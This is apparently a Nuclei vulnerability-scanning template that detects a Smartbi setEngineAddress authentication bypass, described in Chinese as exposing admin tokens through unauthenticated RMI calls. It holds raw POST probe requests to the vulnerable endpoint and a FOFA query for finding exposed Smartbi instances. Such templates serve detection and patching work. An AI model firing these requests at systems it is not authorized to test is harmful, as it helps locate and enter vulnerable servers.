id: smartbi-auth-bypass

info:
  name: Smartbi setEngineAddress 权限绕过
  author: ultimaste
  severity: high
  description: |
    Smartbi smartbix setEngineAddress 接口存在权限绕过，未授权可调用 RMI 接口获取管理员 Token。
  reference:
    - https://mp.weixin.qq.com/s/qwTzdnncx1rsswX04uFxCQ
  metadata:
    max-request: 2
    fofa-query: app="SMARTBI"
  tags: smartbi,bypass

http:
  - raw:
      - |
        POST /smartbi/smartbix/api/monitor/setEngineAddress HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        className=UserService&methodName=isLogged&params=[]
      - |
        POST /smartbix/api/monitor/setEngineAddress HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        className=UserService&methodName=isLogged&params=[]

    stop-at-first-match: true
    matchers:
      - type: word
        part: body
        words:
          - 'smartbix.SmartbiXException'
